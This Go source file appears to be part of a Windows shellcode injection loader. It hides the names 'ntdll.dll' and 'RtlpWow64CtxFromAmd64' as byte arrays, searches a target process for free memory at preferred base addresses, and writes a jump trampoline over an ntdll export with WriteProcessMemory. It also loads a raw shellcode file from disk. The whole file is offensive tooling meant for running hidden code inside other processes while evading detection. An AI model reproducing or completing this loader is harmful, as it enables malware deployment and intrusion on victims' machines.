package main

import (
	"encoding/binary"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"unsafe"
)

const (
	MEM_FREE          = 0x10000
	page_size  uint32 = 0x1000
	alloc_gran uint32 = 0x10000
)

var (
	jmpModName  = []byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}
	jmpFuncName = []byte{'R', 't', 'l', 'p', 'W', 'o', 'w', '6', '4', 'C', 't', 'x', 'F', 'r', 'o', 'm', 'A', 'm', 'd', '6', '4'}
)

var VC_PREF_BASES = [10]uintptr{
	0x00000000DDDD0000,
	0x0000000010000000,
	0x0000000021000000,
	0x0000000032000000,
	0x0000000043000000,
	0x0000000050000000,
	0x0000000041000000,
	0x0000000042000000,
	0x0000000040000000,
	0x0000000022000000,
}

func PreEntry(hProc windows.Handle, vm_base uintptr) uintptr {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, uint64(vm_base))
	var jmpSc = [7]byte{0xB8, b[0], b[1], b[2], b[3], 0xFF, 0xE0}
	hJmpMod, err := windows.LoadLibraryEx(
		string(jmpModName),
		0,
		windows.DONT_RESOLVE_DLL_REFERENCES,
	)
	if err != nil {
		return vm_base
	}

	lpDllExport, _ := windows.GetProcAddress(hJmpMod, string(jmpFuncName))
	offsetJmpFunc := lpDllExport - uintptr(hJmpMod)

	var (
		list        = make([]windows.Handle, 1024)
		cbNeeded    uint32
		lpRemFuncEP uintptr
		szWritten   uintptr
	)

	err = windows.EnumProcessModulesEx(hProc, &list[0], 1024, &cbNeeded, 0)
	if err != nil {
		return vm_base
	}
	for _, m := range list {
		var name [256]uint16
		err := windows.GetModuleFileNameEx(hProc, m, &name[0], 256)
		if err != nil {
			continue
		}
		exeFile := windows.UTF16ToString(name[20:])
		if exeFile == string(jmpModName) {
			lpRemFuncEP = uintptr(m)
			break
		}
	}

	lpRemFuncEP = lpRemFuncEP + offsetJmpFunc
	windows.WriteProcessMemory(
		hProc,
		lpDllExport,
		&jmpSc[0],
		7,
		&szWritten,
	)
	return lpDllExport
}

func GetSuitableBaseAddress(hProc uintptr, szPage uint32, szAllocGran uint32, cVmResv uint32) uintptr {
	var mbi windows.MemoryBasicInformation
	var base uintptr
	for _, base = range VC_PREF_BASES {
		windows.VirtualQueryEx(
			windows.Handle(hProc),
			base,
			&mbi,
			unsafe.Sizeof(mbi),
		)
		if MEM_FREE == mbi.State {
			var i uint32
			for i = 0; i < cVmResv; i++ {
				currentBase := base + uintptr(i*szAllocGran)
				windows.VirtualQueryEx(
					windows.Handle(hProc),
					currentBase,
					&mbi,
					unsafe.Sizeof(mbi),
				)
				if MEM_FREE != mbi.State {
					break
				}
			}
			if i == cVmResv {
				return base
			}
		}
	}
	return 0
}

func ReadProcessBlob(sc string) []byte {
	f, err := os.Open(sc)
	if err != nil {
		println("[-] Open scfile failed...")
		os.Exit(0)
	}
	defer f.Close()
	fd, err := ioutil.ReadAll(f)
	if err != nil {
		println("[-] Read scfile failed...")
		os.Exit(0)
	}
	return fd
}

func is64bit() bool {
	bit := 32 << (^uint(0) >> 63)
	if bit == 64 {
		return true
	} else {
		return false
	}
}
